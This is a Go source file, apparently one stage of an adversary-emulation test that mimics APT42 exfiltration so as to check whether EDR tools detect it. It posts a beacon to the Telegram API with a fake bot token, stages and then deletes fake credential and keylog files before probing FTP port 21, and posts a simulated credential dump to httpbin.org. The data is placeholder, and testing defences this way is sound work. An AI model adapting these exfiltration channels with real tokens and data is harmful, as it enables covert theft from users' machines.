//go:build windows

/*
STAGE 5: Web Service - Bidirectional Communication (T1102)
Simulates APT42 multi-channel exfiltration:
  (a) Telegram API traffic from workstation (primary C2)
  (b) FTP upload artifact simulation
  (c) HTTPS POST data exfiltration
Tests EDR detection of outbound Telegram API traffic and multi-channel data movement.
*/

package main

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "92b0b4f6-a09b-4c7b-b593-31ce461f804c"
	TECHNIQUE_ID   = "T1102"
	TECHNIQUE_NAME = "Multi-Channel Exfiltration via Telegram"
	STAGE_ID       = 5
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting multi-channel exfiltration simulation")
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "Telegram API + FTP + HTTPS POST exfiltration channels")

	if err := performTechnique(); err != nil {
		errStr := strings.ToLower(err.Error())
		if strings.Contains(errStr, "access denied") ||
			strings.Contains(errStr, "blocked") ||
			strings.Contains(errStr, "prevented") ||
			strings.Contains(errStr, "connection refused") ||
			strings.Contains(errStr, "firewall") {
			fmt.Printf("[STAGE %s] Technique blocked: %v\n", TECHNIQUE_ID, err)
			LogMessage("BLOCKED", TECHNIQUE_ID, fmt.Sprintf("Technique blocked: %v", err))
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
			os.Exit(StageBlocked)
		}

		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		os.Exit(StageError)
	}

	LogMessage("SUCCESS", TECHNIQUE_ID, "Multi-channel exfiltration simulation completed")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Exfiltration via Telegram/FTP/HTTPS channels executed without prevention")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	targetDir := "c:\\F0"
	results := make(map[string]string)

	// =========================================================================
	// Channel 1: Telegram API Traffic
	// =========================================================================
	fmt.Printf("[STAGE %s] Channel 1: Testing Telegram API connectivity...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Testing Telegram API connectivity (api.telegram.org)")

	telegramResult := testTelegramAPITraffic()
	results["telegram_api"] = telegramResult
	fmt.Printf("[STAGE %s] Telegram API result: %s\n", TECHNIQUE_ID, telegramResult)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Telegram API: %s", telegramResult))

	// =========================================================================
	// Channel 2: FTP Upload Artifact Simulation
	// =========================================================================
	fmt.Printf("[STAGE %s] Channel 2: Simulating FTP upload artifacts...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Simulating FTP upload data staging")

	ftpResult := simulateFTPUploadArtifacts(targetDir)
	results["ftp_upload"] = ftpResult
	fmt.Printf("[STAGE %s] FTP simulation result: %s\n", TECHNIQUE_ID, ftpResult)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("FTP simulation: %s", ftpResult))

	// =========================================================================
	// Channel 3: HTTPS POST Data Exfiltration
	// =========================================================================
	fmt.Printf("[STAGE %s] Channel 3: Testing HTTPS POST exfiltration...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Testing HTTPS POST data exfiltration pattern")

	httpsResult := testHTTPSPostExfiltration()
	results["https_post"] = httpsResult
	fmt.Printf("[STAGE %s] HTTPS POST result: %s\n", TECHNIQUE_ID, httpsResult)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("HTTPS POST: %s", httpsResult))

	// =========================================================================
	// Evaluate Results
	// =========================================================================
	blockedCount := 0
	for channel, result := range results {
		if strings.Contains(strings.ToLower(result), "blocked") ||
			strings.Contains(strings.ToLower(result), "denied") ||
			strings.Contains(strings.ToLower(result), "refused") {
			blockedCount++
			fmt.Printf("[STAGE %s]   %s: BLOCKED\n", TECHNIQUE_ID, channel)
		} else {
			fmt.Printf("[STAGE %s]   %s: %s\n", TECHNIQUE_ID, channel, result)
		}
	}

	// Save exfiltration test results
	resultsJSON, _ := json.MarshalIndent(results, "", "  ")
	os.WriteFile(filepath.Join(targetDir, "exfil_channel_results.json"), resultsJSON, 0644)

	// If ALL channels blocked, report as blocked
	if blockedCount == len(results) {
		return fmt.Errorf("all exfiltration channels were blocked by security controls")
	}

	// If Telegram specifically was blocked (primary C2 channel), report as blocked
	if strings.Contains(strings.ToLower(results["telegram_api"]), "blocked") ||
		strings.Contains(strings.ToLower(results["telegram_api"]), "refused") {
		fmt.Printf("[STAGE %s] Primary C2 channel (Telegram) was blocked\n", TECHNIQUE_ID)
		LogMessage("INFO", TECHNIQUE_ID, "Primary Telegram C2 channel was blocked - partial protection detected")
		// Still succeed if other channels worked (tests defense in depth)
	}

	fmt.Printf("[STAGE %s] Exfiltration channels: %d blocked / %d total\n", TECHNIQUE_ID, blockedCount, len(results))
	return nil
}

// testTelegramAPITraffic tests connectivity to api.telegram.org
// EDR/firewall should detect and potentially block Telegram API traffic from workstations
func testTelegramAPITraffic() string {
	// Step 1: DNS resolution test for api.telegram.org
	fmt.Printf("[STAGE %s]   Resolving api.telegram.org...\n", TECHNIQUE_ID)
	addrs, err := net.LookupHost("api.telegram.org")
	if err != nil {
		return fmt.Sprintf("blocked - DNS resolution failed: %v", err)
	}
	fmt.Printf("[STAGE %s]   Resolved to: %s\n", TECHNIQUE_ID, strings.Join(addrs, ", "))

	// Step 2: HTTPS connection test to Telegram API
	// Use a benign API endpoint (getMe with no valid token)
	// This tests if the connection itself is allowed - no real bot token used
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	// Fake bot token - this will return 401 Unauthorized but tests if connection is allowed
	fakeToken := "0000000000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/getMe", fakeToken)

	resp, err := client.Get(apiURL)
	if err != nil {
		if strings.Contains(strings.ToLower(err.Error()), "refused") ||
			strings.Contains(strings.ToLower(err.Error()), "blocked") ||
			strings.Contains(strings.ToLower(err.Error()), "timeout") ||
			strings.Contains(strings.ToLower(err.Error()), "unreachable") {
			return fmt.Sprintf("blocked - connection to Telegram API refused: %v", err)
		}
		return fmt.Sprintf("error: %v", err)
	}
	defer resp.Body.Close()

	// Step 3: Simulate sending data via Telegram (POST with benign payload)
	// Using sendMessage endpoint with invalid token - tests connection pattern
	sendURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", fakeToken)
	payload := strings.NewReader(`{"chat_id":"0","text":"F0RT1KA_TEST_BEACON"}`)

	postResp, postErr := client.Post(sendURL, "application/json", payload)
	if postErr != nil {
		return fmt.Sprintf("connection_allowed_but_post_failed: %v (HTTP %d on GET)", postErr, resp.StatusCode)
	}
	defer postResp.Body.Close()

	return fmt.Sprintf("connection_allowed - GET: HTTP %d, POST: HTTP %d (API rejects invalid token but connection was not blocked)", resp.StatusCode, postResp.StatusCode)
}

// simulateFTPUploadArtifacts creates FTP-style staging artifacts
func simulateFTPUploadArtifacts(targetDir string) string {
	// Create FTP upload staging files (simulates data staging before FTP exfil)
	ftpStagingDir := filepath.Join(targetDir, "ftp_staging")
	if err := os.MkdirAll(ftpStagingDir, 0755); err != nil {
		return fmt.Sprintf("error: %v", err)
	}

	// Create simulated exfiltration files
	files := map[string]string{
		"credentials_dump.csv": "F0RT1KA_SIMULATION_DATA\nurl,username,password_hash\nhttps://banking.example.com,user@corp.com,SHA256:0000000000\n",
		"system_info.json":     `{"hostname":"SIMULATED","domain":"EXAMPLE.COM","source":"F0RT1KA_TEST"}`,
		"browser_history.dat":  "SIMULATED_BROWSER_HISTORY\ntimestamp,url\n2026-03-07,https://treasury.example.com\n",
		"keylog_buffer.bin":    "F0RT1KA_SIMULATED_KEYLOG_NO_REAL_DATA_CAPTURED",
	}

	totalSize := 0
	for name, content := range files {
		fPath := filepath.Join(ftpStagingDir, name)
		if err := os.WriteFile(fPath, []byte(content), 0644); err != nil {
			return fmt.Sprintf("error writing %s: %v", name, err)
		}
		totalSize += len(content)
	}

	// Test FTP port connectivity (port 21) - typically blocked on corporate networks
	conn, err := net.DialTimeout("tcp", "ftp.example.com:21", 5*time.Second)
	ftpConnResult := "blocked"
	if err == nil {
		conn.Close()
		ftpConnResult = "allowed"
	}

	// Clean up staging
	os.RemoveAll(ftpStagingDir)

	return fmt.Sprintf("staging_created: %d files (%d bytes), ftp_port_21: %s", len(files), totalSize, ftpConnResult)
}

// testHTTPSPostExfiltration tests HTTPS POST exfiltration patterns
func testHTTPSPostExfiltration() string {
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	// Simulate HTTPS POST to a benign endpoint (httpbin-style)
	// This tests if large POST requests to external services are monitored
	simulatedExfilData := map[string]interface{}{
		"source":     "F0RT1KA_TEST",
		"timestamp":  time.Now().Format(time.RFC3339),
		"type":       "credential_dump_simulation",
		"data":       "SIMULATED_NO_REAL_DATA_CONTAINED",
		"chunks":     4,
		"total_size": 16384,
		"agent_id":   TEST_UUID,
	}

	jsonData, _ := json.Marshal(simulatedExfilData)

	// Test 1: POST to a known data collection endpoint pattern
	// Using httpbin.org which echoes back data (safe for testing)
	resp, err := client.Post("https://httpbin.org/post", "application/json", strings.NewReader(string(jsonData)))
	if err != nil {
		if strings.Contains(strings.ToLower(err.Error()), "refused") ||
			strings.Contains(strings.ToLower(err.Error()), "blocked") ||
			strings.Contains(strings.ToLower(err.Error()), "timeout") {
			return fmt.Sprintf("blocked - HTTPS POST refused: %v", err)
		}
		return fmt.Sprintf("error: %v", err)
	}
	defer resp.Body.Close()

	return fmt.Sprintf("connection_allowed - HTTP %d (%d bytes sent)", resp.StatusCode, len(jsonData))
}
